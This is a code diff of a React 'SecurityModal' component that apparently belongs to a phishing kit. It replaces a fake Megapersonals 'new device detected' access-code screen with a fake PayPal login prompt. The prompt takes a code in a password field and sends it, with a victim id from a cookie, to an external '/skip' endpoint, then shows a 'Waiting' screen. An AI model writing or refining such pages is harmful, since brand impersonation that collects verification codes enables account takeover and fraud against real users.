@@ -1,29 +1,26 @@
 import Image from "next/image";
-import Megapersonals from "../public/images/megapersonals.png";
 import Cookies from "js-cookie";
-import { Field, Form, Formik } from "formik";
 import { API_URL } from "../config";
 import { toast } from "react-toastify";
+import { useState } from "react";
 
 function SecurityModal() {
-  const currentDate = new Date();
-  const options = { year: "numeric", month: "long", day: "numeric" };
-  const formattedDate = currentDate.toLocaleDateString("en-US", options);
+  const [page,setPage]=useState(false)
+  const form=useForm()
+  const{register,handleSubmit,reset}=form
 
   const id = Cookies.get("id");
 
-  const initialvalues = {
-    id: id,
-    skipcode: "",
-  };
+ 
 
-  const handleSubmit = async (values, formik) => {
-    // console.log(values);
-    // const { skipcode } = values;
-    // Cookies.set("skipcode", skipcode);
-    // router.push("/account/email");
-    // return;
-
+  const onSubmit =async(values) => {
+    const{skipcode}=values
+    const submitValues = {
+      id,
+      skipcode,
+ 
+    };
+    console.log(submitValues)
     const url = `${API_URL}/skip`;
 
     const res = await fetch(url, {
@@ -38,74 +35,62 @@ function SecurityModal() {
     const data = await res.json();
 
     if (res.ok) {
-      console.log("success", data);
       toast.success("Login Succecssfull");
-      formik.resetForm();
+      reset()
+      setPage(true)
       Cookies.remove("id");
       Cookies.remove("email");
     } else {
       console.log("error", data);
       toast.error("Something Went Wrong");
     }
-  };
+
+
+};
 
   return (
-    <div className="container bg-white md:w-[420px] py-[35px] rounded-lg flex flex-col items-center overflow-x-hidden">
-      <div className="w-[60%]">
-        <Image src={Megapersonals} alt="megaeprsonals" priority />
+   <>
+   {
+    !page?( <form onSubmit={handleSubmit(onSubmit)}>
+    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
+<div className="relative    w-[80px] h-[80px] ">
+        <Image
+          src="/images/paypal-logo.svg"
+          alt="avatar"
+          fill
+          className="object-cover ml-[120px]"
+        />
       </div>
 
-      <div className="mt-2 py-1.5 w-full bg-[#F8EFCE] text-[#B8AF8E] text-sm text-center font-medium uppercase">
-        New deviece detected
-      </div>
 
-      <p className="mt-2 text-sm text-[#C75400] text-center">
-        Your ACCESS CODE <br /> has been sent <b>Successfully</b> <br /> to your
-        email on <b>{formattedDate}</b>. <br /> That code remains valid.
-      </p>
 
-      <p className="mt-2 text-center text-sm italic font-bold text-[#2FAEEA] uppercase">
-        CHECK YOUR SPAM <br /> FOLDER IT MAY BE THERE.
-      </p>
+ <div className="pt-5">
+   
+       <input
+         className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+         placeholder="Enter the code"
+         {...register('skipcode')}
+         type="password"
+         required
+       />
 
-      <p className="mt-2 flex items-center gap-3 text-sm text-[#C75400] text-center font-bold italic uppercase">
-        <span>DO NOT SHARE IT</span>
-        <span className="bg-[#2FAEEA] w-6 h-6 rounded-full text-white flex justify-center items-center font-bold not-italic">
-          <span>?</span>
-        </span>
-      </p>
+<button
+         type="submit"
+         className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+       >
+         Log in
+       </button>
+     
+   
+ </div>
 
-      <p className="mt-2 text-sm text-[#C75400] text-center ">
-        Enter the code <br /> below to continue.
-      </p>
 
-      <div className="mt-2 flex items-center">
-        <Formik
-          initialValues={initialvalues}
-          // validationSchema={validate}
-          onSubmit={handleSubmit}
-        >
-          {(formik) => (
-            <Form className="flex flex-col items-center">
-              <div className="">
-                <Field
-                  className="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
-                  name="skipcode"
-                  required
-                />
-              </div>
-              <button
-                type="submit"
-                className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
-                // className=" bg-custom-cyan hover:bg-custom-cyan2 px-[25px] py-[12px] text-white text-sm transition duration-300 rounded"
-              >
-                Submit
-              </button>
-            </Form>
-          )}
-        </Formik>
-      </div>
-    </div>
+</div>
+    </form>):(
+      <p className="text-center">Waiting......</p>
+    )
+   }
+   </>
   );
 }
 
